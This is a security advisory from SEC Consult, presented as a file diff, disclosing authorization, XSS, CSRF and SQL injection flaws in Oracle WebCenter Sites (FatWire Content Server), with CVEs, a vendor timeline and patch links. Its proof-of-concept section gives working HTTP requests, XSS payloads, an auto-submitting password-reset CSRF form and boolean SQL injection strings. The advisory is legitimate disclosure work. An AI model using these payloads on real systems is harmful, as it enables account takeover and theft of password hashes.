@@ -1,0 +1,229 @@
+SEC Consult Vulnerability Lab Security Advisory < 20121017-2 >
+=======================================================================
+              title: Multiple vulnerabilities in Oracle WebCenter Sites
+            product: Oracle WebCenter Sites (former FatWire Content Server)
+ vulnerable version: 6.1, 6.2, 6.3.x, 7, 7.0.1, 7.0.2, 7.0.3, 7.5, 7.6.1,
+                     7.6.2, 11.1.1.6.0
+      fixed version: Patch information see sections below
+                CVE: CVE-2012-3183 (S0183794)
+                     CVE-2012-3184 (S0183815)
+                     CVE-2012-3185 (S0183827)
+                     CVE-2012-3186 (S0183836)
+             impact: High
+           homepage: http://www.oracle.com/us/corporate/acquisitions/fatwire/index.html
+              found: 21.05.2012
+                 by: F. Lukavsky 
+                     SEC Consult Vulnerability Lab 
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+FatWire Content Server is a predecessor product of Oracle WebCenter Sites.
+
+FatWire Content Server is a software suite that allows you to create and 
+manage content to be published on your online site. The content is stored in 
+Content Server's database. You create and manipulate the content using Content 
+Server's interface, which provides a simple and intuitive way of accessing and 
+working with the CS database.
+
+FatWire Content Server 7 - Advanced Interface User's Guide
+<http://docs.oracle.com/cd/E28662_01/doc.76/content_server/cs_user_advanced_76p2.pdf>
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Authorization Issues
+   The backend of the Content Server fails to validate authorization for
+   certain requests. This allows low privileged users manipulating data, 
+   which they are not authorized to.
+   
+2) Cross-Site Scripting
+   The backend of the Content Server is prone to permanent and reflected 
+   Cross-Site Scripting attacks. The vulnerability can be used to include 
+   HTML- or JavaScript code to the affected web page. The code is executed 
+   in the browser of users if they visit the manipulated site. The 
+   vulnerability can be used to change the contents of the displayed site, 
+   redirect to other sites or steal user credentials. Additionally, Portal 
+   users are potential victims of browser exploits and JavaScript Trojans. 
+   
+3) Cross-Site Request Forgery
+   An attacker can use Cross-Site Request Forgery to perform arbitrary web 
+   requests with the identity of the victim without being noticed by the 
+   victim. Although responses to these requests are not delivered to the 
+   attacker, in many cases it is sufficient to be able to compromise the 
+   integrity of the victim's information stored on the site or to perform 
+   certain, possibly compromising requests to other sites.
+   
+4) SQL Injection
+   Due to insufficient input validation, the backend of FatWire Content 
+   Server allows the injection of direct SQL commands. By exploiting the 
+   vulnerability, an attacker gains access to all records stored in the 
+   database with the privileges of database user CSAUTHORING.
+
+
+Proof of concept:
+-----------------
+
+1) In the user profile, users are given the possibility to change their email 
+   address. By supplying arbitrary user names, a low privileged user can 
+   change the email address of other users:
+   
+        POST /cs/ContentServer HTTP/1.1
+
+        _charset_=UTF-8&cs_environment=standard&cs_formmode=WCM&username=<username
+        of the target user>&email=<new email
+        address>&selectedLocale=None&userid=userid%3D<own user
+        
+id>%2Cou%3DPeople&manageprofile=true&password=&password2=&pagename=OpenMarket%2FXcelerate%2FAdmin%2FUserProfilePost&action=edit
+
+2) The display name of page elements are included unsanitized when viewing 
+   the element's details. Creating a new image with the following manipulated 
+   parameter demonstrates this issue:
+   
+   -----------------------------6083206021221
+   Content-Disposition: form-data; name="flexassets:name"
+   
+   xxx.jsp</script><script>alert(document.location)</script>
+   -----------------------------6083206021221
+   
+   
+   Additionally, users can change their email address in the user profile 
+   management. The email address is included unsanitized when viewing a 
+   manipulated profile. Furthermore, by combining this issue with the attack 
+   described in vulnerability (1), the Cross-Site Scripting payload can be 
+   embedded in the user profile of arbitrary users. The following request 
+   demonstrates this issue:
+   
+        POST /cs/ContentServer HTTP/1.1
+
+        _charset_=UTF-8&cs_environment=standard&cs_formmode=WCM&username=<username
+        of the target user>&email=<manipulated email
+        address>%3Cscript%3Ealert%28document.location%29%3C%2Fscript%3E&selectedLocale=None&userid=userid%3D<own
+        user
+        
+id>%2Cou%3DPeople&manageprofile=true&password=&password2=&pagename=OpenMarket%2FXcelerate%2FAdmin%2FUserProfilePost&action=edit
+        Many parameters are included unsanitized in error messages, which
+        leads to reflected Cross-Site Scripting vulnerabilities:
+        
+http://fatwire/cs/ContentServer?username=<script>alert(document.location)</script>&manageprofile=true&action=edit&pagename=OpenMarket%2FXcelerate%2FAdmin%2FUserProfileFront
+ 
+   
+http://fatwire/cs/ContentServer?StartItem=1327334935133";><script>alert(document.location)</script>&AssetType=Page&cs_environment=standard&pagename=OpenMarket%2FXcelerate%2FActions%2FNewContentFront&cs_formmode=WCM
+   
+   These examples raise no claims of being complete.   
+
+   
+3) A low privileged user can view all available users and their user ids 
+   when creating a workflow report. When the target user submits the 
+   following form while being logged in, an attacker can change the 
+   password of the target user to an arbitrary value:
+   
+    <html>
+          <body onload="document.forms[0].submit()">
+                <form action="http://fatwire/cs/ContentServer"; method="POST">
+                  <input type="hidden" name="_charset_" value="UTF-8" />
+                  <input type="hidden" name="cs_environment"
+value="standard" /> <input type="hidden" name="cs_formmode" value="WCM" />
+                  <input type="hidden" name="username" value="<target user>" />
+                  <input type="hidden" name="email" value="" />
+                  <input type="hidden" name="selectedLocale" value="None" />
+                  <input type="hidden" name="userid" 
+                                 value="userid=<target user id>,ou=People" />
+                  <input type="hidden" name="modifyPassword" value="on" />
+                  <input type="hidden" name="manageprofile" value="true" />
+                  <input type="hidden" name="password" value="<new
+password>" /> <input type="hidden" name="password2" value="<new password>" />
+                  <input type="hidden" name="pagename" 
+                                 value="OpenMarket/Xcelerate/Admin/UserProfilePost" />
+                  <input type="hidden" name="action" value="edit" />
+                </form>
+          </body>
+        </html>
+
+   
+4) The parameter selectedLocale of the user profile management form is 
+   vulnerable to a SQL Injection vulnerability. The following true comparison 
+   added to the SQL query results in the locale preference to be set to 
+   English (United States):
+   
+        POST /cs/ContentServer HTTP/1.1
+
+        _charset_=UTF-8&cs_environment=standard&cs_formmode=WCM&username=user&email=mail () example 
+com&selectedLocale=None'+or+1%3d1--+&userid=userid%
+        
+3D1327334925026%2Cou%3DPeople&manageprofile=true&pagename=OpenMarket%2FXcelerate%2FAdmin%2FUserProfilePost&action=edit 
+   The following request with a false comparison being added to the SQL query 
+   results in the locale preference to be set to no preference:
+   
+        POST /cs/ContentServer HTTP/1.1
+
+        _charset_=UTF-8&cs_environment=standard&cs_formmode=WCM&username=user&email=mail () example 
+com&selectedLocale=None'+or+1%3d2--+&userid=userid%
+        
+3D1327334925026%2Cou%3DPeople&manageprofile=true&pagename=OpenMarket%2FXcelerate%2FAdmin%2FUserProfilePost&action=edit
+
+   Observing these differences, arbitrary data of the database can be 
+   extracted bitwise. This includes for example the password hashes of other 
+   Content Server users.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following installation has been tested: FatWire Content Server 7.6.1
+Hotfix 4
+
+
+The following versions have been supplied by Oracle and are vulnerable too:
+6.1, 6.2, 6.3.x, 7, 7.0.1, 7.0.2, 7.0.3, 7.5, 7.6.1, 7.6.2, 11.1.1.6.0
+
+
+
+Vendor contact timeline:
+------------------------
+2012-06-04: Contacting vendor through secalert_us () oracle com
+2012-06-07: Initial vendor response - issues will be verified
+2012-06-21: Under investigation / Being fixed in main codeline
+2012-07-24: Issue fixed in main codeline, scheduled for a future CPU
+2012-10-15: Oracle: Advisory and patches will be released on 2012-10-16
+2012-10-16: Oracle releases October 2012 CPU
+2012-10-17: Public release of SEC Consult advisory
+
+
+
+Solution:
+---------
+Apply latest patches, see:
+
+http://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html
+https://support.oracle.com/rs?type=doc&id=1477727.1
+
+
+Workaround:
+-----------
+Restrict access to the backend of the FatWire Content Server.
+Do not visit untrusted sites while being logged into the backend of the 
+FatWire Content Server.
+Keep the time being logged in as short as possible and do not activate 
+the option to stay logged into the backend of the FatWire Content Server.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/advisories.html
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Unternehmensberatung GmbH
+
+Office Vienna
+Mooslackengasse 17
+A-1190 Vienna
+Austria
+
+Tel.: +43 / 1 / 890 30 43 - 0
+Fax.: +43 / 1 / 890 30 43 - 25
+Mail: research at sec-consult dot com
+https://www.sec-consult.com
+
+EOF F. Lukavsky / @2012
